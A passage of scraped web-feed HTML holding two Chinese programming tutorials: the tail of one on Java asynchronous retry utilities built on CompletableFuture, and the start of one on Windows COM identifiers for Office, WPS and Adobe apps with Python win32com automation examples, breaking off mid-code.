    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">retryWithCondition</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            Predicate&lt;Throwable&gt; shouldRetry,
            <span class="hljs-type">int</span> maxAttempts,
            Function&lt;Integer, Long&gt; delayCalculator,
            <span class="hljs-type">int</span> attempt,
            CompletableFuture&lt;T&gt; result)</span> {
        
        task.get().whenComplete((response, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                result.complete(response);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-type">boolean</span> <span class="hljs-variable">canRetry</span> <span class="hljs-operator">=</span> attempt &lt; maxAttempts &amp;&amp; shouldRetry.test(throwable);
            
            <span class="hljs-keyword">if</span> (!canRetry) {
                result.completeExceptionally(throwable);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> delayCalculator.apply(attempt);
            CompletableFuture.delayedExecutor(delay, TimeUnit.MILLISECONDS)
                .execute(() -&gt; 
                    retryWithCondition(task, shouldRetry, maxAttempts, delayCalculator, attempt + <span class="hljs-number">1</span>, result)
                );
        });
    }
}
</code></pre>
<h3 data-id="heading-21">3.4 完整的重试工具类</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncRetryUtil</span> {
    
    <span class="hljs-comment">/**
     * 异步重试执行器
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncRetryBuilder</span>&lt;T&gt; {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Supplier&lt;CompletableFuture&lt;T&gt;&gt; task;
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">maxAttempts</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;
        <span class="hljs-keyword">private</span> Predicate&lt;Throwable&gt; retryCondition = ex -&gt; <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">private</span> Function&lt;Integer, Long&gt; delayStrategy = attempt -&gt; <span class="hljs-number">1000L</span> * attempt;
        <span class="hljs-keyword">private</span> Consumer&lt;Integer&gt; onRetry = attempt -&gt; {};
        <span class="hljs-keyword">private</span> Function&lt;Throwable, T&gt; fallback = <span class="hljs-literal">null</span>;
        
        <span class="hljs-keyword">private</span> <span class="hljs-title function_">AsyncRetryBuilder</span><span class="hljs-params">(Supplier&lt;CompletableFuture&lt;T&gt;&gt; task)</span> {
            <span class="hljs-built_in">this</span>.task = task;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(Supplier&lt;CompletableFuture&lt;T&gt;&gt; task)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncRetryBuilder</span>&lt;&gt;(task);
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">maxAttempts</span><span class="hljs-params">(<span class="hljs-type">int</span> maxAttempts)</span> {
            <span class="hljs-built_in">this</span>.maxAttempts = maxAttempts;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">retryIf</span><span class="hljs-params">(Predicate&lt;Throwable&gt; condition)</span> {
            <span class="hljs-built_in">this</span>.retryCondition = condition;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">delayStrategy</span><span class="hljs-params">(Function&lt;Integer, Long&gt; strategy)</span> {
            <span class="hljs-built_in">this</span>.delayStrategy = strategy;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">onRetry</span><span class="hljs-params">(Consumer&lt;Integer&gt; callback)</span> {
            <span class="hljs-built_in">this</span>.onRetry = callback;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">fallback</span><span class="hljs-params">(Function&lt;Throwable, T&gt; fallback)</span> {
            <span class="hljs-built_in">this</span>.fallback = fallback;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> CompletableFuture&lt;T&gt; <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
            CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
            execute(<span class="hljs-number">1</span>, result);
            <span class="hljs-keyword">return</span> result;
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-type">int</span> attempt, CompletableFuture&lt;T&gt; result)</span> {
            task.get().whenComplete((response, throwable) -&gt; {
                <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                    result.complete(response);
                    <span class="hljs-keyword">return</span>;
                }
                
                <span class="hljs-type">boolean</span> <span class="hljs-variable">shouldRetry</span> <span class="hljs-operator">=</span> attempt &lt; maxAttempts &amp;&amp; retryCondition.test(throwable);
                
                <span class="hljs-keyword">if</span> (!shouldRetry) {
                    <span class="hljs-keyword">if</span> (fallback != <span class="hljs-literal">null</span>) {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-type">T</span> <span class="hljs-variable">fallbackResult</span> <span class="hljs-operator">=</span> fallback.apply(throwable);
                            result.complete(fallbackResult);
                        } <span class="hljs-keyword">catch</span> (Exception e) {
                            result.completeExceptionally(e);
                        }
                    } <span class="hljs-keyword">else</span> {
                        result.completeExceptionally(throwable);
                    }
                    <span class="hljs-keyword">return</span>;
                }
                
                onRetry.accept(attempt);
                <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> delayStrategy.apply(attempt);
                
                CompletableFuture.delayedExecutor(delay, TimeUnit.MILLISECONDS)
                    .execute(() -&gt; execute(attempt + <span class="hljs-number">1</span>, result));
            });
        }
    }
}
</code></pre>
<h3 data-id="heading-22">3.5 使用示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 模拟不可靠的服务</span>
        Supplier&lt;CompletableFuture&lt;String&gt;&gt; unreliableService = () -&gt; 
            CompletableFuture.supplyAsync(() -&gt; {
                <span class="hljs-type">double</span> <span class="hljs-variable">rand</span> <span class="hljs-operator">=</span> Math.random();
                <span class="hljs-keyword">if</span> (rand &lt; <span class="hljs-number">0.8</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"服务暂时不可用"</span>);
                }
                <span class="hljs-keyword">return</span> <span class="hljs-string">"服务调用成功"</span>;
            });
        
        <span class="hljs-comment">// 使用重试工具</span>
        CompletableFuture&lt;String&gt; result = AsyncRetryUtil.AsyncRetryBuilder
            .of(unreliableService)
            .maxAttempts(<span class="hljs-number">5</span>)
            .retryIf(ex -&gt; ex.getMessage().contains(<span class="hljs-string">"暂时不可用"</span>))
            .delayStrategy(attempt -&gt; <span class="hljs-number">1000L</span> * attempt) <span class="hljs-comment">// 线性退避</span>
            .onRetry(attempt -&gt; 
                System.out.println(<span class="hljs-string">"第 "</span> + attempt + <span class="hljs-string">" 次重试..."</span>))
            .fallback(ex -&gt; <span class="hljs-string">"降级结果"</span>)
            .execute();
        
        result.whenComplete((response, error) -&gt; {
            <span class="hljs-keyword">if</span> (error != <span class="hljs-literal">null</span>) {
                System.out.println(<span class="hljs-string">"最终失败: "</span> + error.getMessage());
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"最终结果: "</span> + response);
            }
        });
        
        <span class="hljs-comment">// 等待异步操作完成</span>
        Thread.sleep(<span class="hljs-number">10000</span>);
    }
}
</code></pre>
<h2 data-id="heading-23">4. 注意事项</h2>
<h3 data-id="heading-24">4.1 重试策略选择</h3>
<ul>
<li><strong>网络超时</strong>：使用指数退避 + 随机抖动</li>
<li><strong>服务限流</strong>：根据返回的等待时间重试</li>
<li><strong>业务错误</strong>：根据具体错误码决定是否重试</li>
</ul>
<h3 data-id="heading-25">4.2 避免的问题</h3>
<ol>
<li><strong>无限重试</strong>：设置最大重试次数</li>
<li><strong>资源耗尽</strong>：合理控制重试频率</li>
<li><strong>雪崩效应</strong>：使用断路器模式配合重试</li>
<li><strong>重复操作</strong>：确保操作的幂等性</li>
</ol>
<h3 data-id="heading-26">4.3 监控和日志</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 添加重试监控</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryMonitor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">MeterRegistry</span> <span class="hljs-variable">meterRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMeterRegistry</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recordRetry</span><span class="hljs-params">(String operation, <span class="hljs-type">int</span> attempt)</span> {
        Counter.builder(<span class="hljs-string">"retry.attempts"</span>)
            .tag(<span class="hljs-string">"operation"</span>, operation)
            .register(meterRegistry)
            .increment();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recordSuccess</span><span class="hljs-params">(String operation, <span class="hljs-type">long</span> duration)</span> {
        Timer.builder(<span class="hljs-string">"retry.duration"</span>)
            .tag(<span class="hljs-string">"operation"</span>, operation)
            .tag(<span class="hljs-string">"status"</span>, <span class="hljs-string">"success"</span>)
            .register(meterRegistry)
            .record(duration, TimeUnit.MILLISECONDS);
    }
}
</code></pre>
<p>具体业务场景选择合适的重试策略，提高系统的容错能力和稳定性。</p>
<blockquote>
<p>本文首发于公众号：程序员大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote>
<h4 data-id="heading-27">📌往期内容</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FUqzEppE_f8gdil6S-toBTg" target="_blank" title="https://mp.weixin.qq.com/s/UqzEppE_f8gdil6S-toBTg" ref="nofollow noopener noreferrer">写前端久了，我用 Node.js 给自己造了几个省力小工具</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FF4JkmYxUs9RAtsti6V1uhg" target="_blank" title="https://mp.weixin.qq.com/s/F4JkmYxUs9RAtsti6V1uhg" ref="nofollow noopener noreferrer">我也是写了很久 TypeScript，才意识到这些写法不对</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F2wHCiqgtRfK_008fLBamPQ" target="_blank" title="https://mp.weixin.qq.com/s/2wHCiqgtRfK_008fLBamPQ" ref="nofollow noopener noreferrer">ThreadLocal 在实际项目中的 6 大用法，原来可以这么简单</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsMAKhSLNvmU1ddxg0yv9Fg" target="_blank" title="https://mp.weixin.qq.com/s/sMAKhSLNvmU1ddxg0yv9Fg" ref="nofollow noopener noreferrer">重构了20个SpringBoot项目后，总结出这套稳定高效的架构设计</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[python win32COM 对象介绍调用Word、WPS 与应用生态]]></title>    <link>https://juejin.cn/post/7594785614177239080</link>    <guid>https://juejin.cn/post/7594785614177239080</guid>    <pubDate>2026-01-14T06:47:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594785614177239080" data-draft-id="7594745643893063715" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="python win32COM 对象介绍调用Word、WPS 与应用生态"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-14T06:47:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="red润"/> <meta itemprop="url" content="https://juejin.cn/user/372051848729127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            python win32COM 对象介绍调用Word、WPS 与应用生态
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/372051848729127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    red润
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T06:47:52.000Z" title="Wed Jan 14 2026 06:47:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">python win32COM 对象介绍调用Word、WPS 与应用生态</h2>
<blockquote>
<p>在日常工作中，我们经常会用到各种办公软件，但你是否想过这些软件是如何被程序调用的？</p>
<p>这里我使用<strong>python</strong>语言作为示例</p>
</blockquote>
<h3 data-id="heading-1">com 对照标识符</h3>
<pre><code class="hljs language-makefile" lang="makefile">office_apps = {
    <span class="hljs-comment"># Microsoft Office</span>
    <span class="hljs-string">"Word.Application"</span>: <span class="hljs-string">"Microsoft Word"</span>,
    <span class="hljs-string">"Excel.Application"</span>: <span class="hljs-string">"Microsoft Excel"</span>, 
    <span class="hljs-string">"PowerPoint.Application"</span>: <span class="hljs-string">"Microsoft PowerPoint"</span>,
    <span class="hljs-string">"Outlook.Application"</span>: <span class="hljs-string">"Microsoft Outlook"</span>,
    
    <span class="hljs-comment"># WPS Office</span>
    <span class="hljs-string">"wps.Application"</span>: <span class="hljs-string">"WPS Office (新版)"</span>,
    <span class="hljs-string">"Kwps.Application"</span>: <span class="hljs-string">"WPS 文字"</span>,
    <span class="hljs-string">"Kwpp.Application"</span>: <span class="hljs-string">"WPS 演示"</span>, 
    <span class="hljs-string">"Ket.Application"</span>: <span class="hljs-string">"WPS 表格"</span>,
    
    <span class="hljs-comment"># 其他办公软件</span>
    <span class="hljs-string">"Photoshop.Application"</span>: <span class="hljs-string">"Adobe Photoshop"</span>,
    <span class="hljs-string">"AcroExch.App"</span>: <span class="hljs-string">"Adobe Acrobat"</span>,
}
</code></pre>
<p>上面是一个办公软件的“地图”，这些是 <strong>Windows</strong> 平台上办公软件的 COM 接口标识符。</p>
<h3 data-id="heading-2">什么是 COM？</h3>
<p>COM（Component Object Model，组件对象模型）是微软在 1990 年代开发的一种二进制接口标准。它允许不同编程语言编写的软件组件进行通信。简单来说，COM 让程序可以通过一个“代号”<strong>调用其他软件的功能</strong>。</p>
<h3 data-id="heading-3">办公软件</h3>
<h4 data-id="heading-4">1. 微软 Office 家族</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"Word.Application"</span>: <span class="hljs-string">"Microsoft Word"</span>          <span class="hljs-comment"># 文字处理</span>
<span class="hljs-string">"Excel.Application"</span>: <span class="hljs-string">"Microsoft Excel"</span>        <span class="hljs-comment"># 电子表格</span>
<span class="hljs-string">"PowerPoint.Application"</span>: <span class="hljs-string">"Microsoft PowerPoint"</span>  <span class="hljs-comment"># 演示文稿</span>
<span class="hljs-string">"Outlook.Application"</span>: <span class="hljs-string">"Microsoft Outlook"</span>    <span class="hljs-comment"># 邮件管理</span>
</code></pre>
<p>微软 Office 是最经典的办公套件，它的 COM 接口命名最为规范：</p>
<ul>
<li>每个应用都有自己独立的 Application 对象</li>
<li>命名直接明了：<code>软件名.Application</code></li>
<li>提供了最完整的编程接口</li>
</ul>
<p><strong>有趣的事实</strong>：通过 COM 接口，你可以用 <strong>Python</strong>等 自动生成报告、处理数据、制作 PPT，实现办公自动化。</p>
<h4 data-id="heading-5">2. 金山 WPS 家族</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"wps.Application"</span>: <span class="hljs-string">"WPS Office (新版)"</span>,       <span class="hljs-comment"># 统一入口</span>
<span class="hljs-string">"Kwps.Application"</span>: <span class="hljs-string">"WPS 文字"</span>,              <span class="hljs-comment"># 文字处理</span>
<span class="hljs-string">"Kwpp.Application"</span>: <span class="hljs-string">"WPS 演示"</span>,               <span class="hljs-comment"># 演示文稿</span>
<span class="hljs-string">"Ket.Application"</span>: <span class="hljs-string">"WPS 表格"</span>                <span class="hljs-comment"># 电子表格</span>
</code></pre>
<p>WPS 的命名规则很有意思：</p>
<ul>
<li><strong>K</strong> 代表金山（Kingsoft）</li>
<li><strong>wps</strong> 是核心应用</li>
<li><strong>wpp</strong> 对应 PowerPoint</li>
<li><strong>ket</strong> 对应 Excel</li>
</ul>
<p>WPS 提供了两种调用方式：</p>
<ul>
<li>统一接口：<code>wps.Application</code>（新版本）</li>
<li>独立应用：分别调用文字、演示、表格</li>
</ul>
<p><strong>版本演变</strong>：从独立的 <code>Kwps</code>、<code>Kwpp</code>、<code>Ket</code>到统一的 <code>wps.Application</code>。</p>
<h4 data-id="heading-6">3. Adobe 专业工具</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"Photoshop.Application"</span>: <span class="hljs-string">"Adobe Photoshop"</span>    <span class="hljs-comment"># 图像处理</span>
<span class="hljs-string">"AcroExch.App"</span>: <span class="hljs-string">"Adobe Acrobat"</span>               <span class="hljs-comment"># PDF 处理</span>
</code></pre>
<p>Adobe 系列是设计领域的标杆：</p>
<ul>
<li>Photoshop 的接口相对独立</li>
<li>Acrobat 使用的是 <code>AcroExch.App</code>这个特殊的名字</li>
<li>主要用于专业设计、PDF 处理等场景</li>
</ul>
<h3 data-id="heading-7">实际应用场景</h3>
<h4 data-id="heading-8">自动化办公</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> win32com.client
​
<span class="hljs-comment"># 自动生成 Word 报告</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_report</span>():
    <span class="hljs-comment"># 尝试 WPS，失败则用 Word</span>
    <span class="hljs-keyword">for</span> app_name <span class="hljs-keyword">in</span> [<span class="hljs-string">"wps.Application"</span>, <span class="hljs-string">"Kwps.Application"</span>, <span class="hljs-string">"Word.Application"</span>]:
        <span class="hljs-keyword">try</span>:
            word = win32com.client.Dispatch(app_name)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"使用: <span class="hljs-subst">{app_name}</span>"</span>)
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">continue</span>
    
    doc = word.Documents.Add()
    <span class="hljs-comment"># ... 添加内容、格式、图表 ...</span>
    doc.SaveAs(<span class="hljs-string">"月报.docx"</span>)
    word.Quit()
</code></pre>
<h4 data-id="heading-9">批量文档转换</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_docs_to_pdf</span>(<span class="hljs-params">input_folder, output_folder</span>):
    <span class="hljs-string">"""批量将文档转换为 PDF"""</span>
    <span class="hljs-keyword">import</span> os
    
    <span class="hljs-comment"># 检测可用应用</span>
    <span class="hljs-keyword">for</span> app_id <span class="hljs-keyword">in</span> [<span class="hljs-string">"wps.Application"</span>, <span class="hljs-string">"Word.Application"</span>]:
        <span class="hljs-keyword">try</span>:
            app = win32com.client.Dispatch(app_id)
            app.Visible = <span class="hljs-literal">False</span>
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">continue</span>
    
    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> os.listdir(input_folder):
        <span class="hljs-keyword">if</span> file.endswith((<span class="hljs-string">'.doc'</span>, <span class="hljs-string">'.docx'</span>)):
            doc_path = os.path.join(input_folder, file)
            pdf_path = os.path.join(output_folder, file.replace(<span class="hljs-string">'.docx'</span>, <span class="hljs-string">'.pdf'</span>))
            
            doc = app.Documents.Open(doc_path)
            doc.ExportAsFixedFormat(pdf_path, <span class="hljs-number">17</span>)  <span class="hljs-comment"># 17 表示 PDF</span>
            doc.Close()
    
    app.Quit()
</code></pre>
<h4 data-id="heading-10">智能应用检测</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect_office_software</span>():
    <span class="hljs-string">"""检测系统安装的办公软件"""</span>
    results = {
        <span class="hljs-string">"microsoft_office"</span>: [],
        <span class="hljs-string">"wps_office"</span>: [],
        <span class="hljs-string">"adobe"</span>: []
    }
    
    <span class="hljs-keyword">for</span> prog_id, app_name <span class="hljs-keyword">in</span> office_apps.items():
        <span class="hljs-keyword">try</span>:
            app = win32com.client.Dispatch(prog_id)
            version = <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">"Version"</span>, <span class="hljs-string">"未知"</span>)
            
            <span class="hljs-keyword">if</span> <span class="hljs-string">"Word"</span> <span class="hljs-keyword">in</span> app_name <span class="hljs-keyword">or</span> <span class="hljs-string">"Excel"</span> <span class="hljs-keyword">in</span> app_name <span class="hljs-keyword">or</span> <span class="hljs-string">"PowerPoint"</span> <span class="hljs-keyword">in</span> app_name:
                results[<span class="hljs-string">"microsoft_office"</span>].append(<span class="hljs-string">f"<span class="hljs-subst">{app_name}</span> (v<span class="hljs-subst">{version}</span>)"</span>)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">"WPS"</span> <span class="hljs-keyword">in</span> app_name:
                results[<span class="hljs-string">"wps_office"</span>].append(<span class="hljs-string">f"<span class="hljs-subst">{app_name}</span> (v<span class="hljs-subst">{version}</span>)"</span>)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">"Photoshop"</span> <span class="hljs-keyword">in</span> app_name <span class="hljs-keyword">or</span> <span class="hljs-string">"Acrobat"</span> <span class="hljs-keyword">in</span> app_name:
                results[<span class="hljs-string">"adobe"</span>].append(<span class="hljs-string">f"<span class="hljs-subst">{app_name}</span> (v<span class="hljs-subst">{version}</span>)"</span>)
                
            app.Quit()
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">continue</span>
    
    <span class="hljs-keyword">return</span> results
</code></pre>
<h3 data-id="heading-11">应用场景</h3>
<h4 data-id="heading-12">自动化办公</h4>
<ul>
<li>批量处理文档</li>
<li>自动生成报告</li>
<li>数据整理和分析</li>
</ul>
<h4 data-id="heading-13">软件集成</h4>
<ul>
<li>在自家软件中嵌入 Office 功能</li>
<li>实现文档预览、编辑</li>
<li>提供格式转换服务</li>
</ul>
<h4 data-id="heading-14">企业应用开发</h4>
<ul>
<li>企业内部系统集成</li>
<li>工作流自动化</li>
<li>文档管理系统</li>
</ul>
<h3 data-id="heading-15">技术细节</h3>
<h4 data-id="heading-16">COM 接口的原理</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建应用实例</span>
<span class="hljs-attr">app</span> = win32com.client.Dispatch(<span class="hljs-string">"Word.Application"</span>)
​
<span class="hljs-comment"># 调用方法</span>
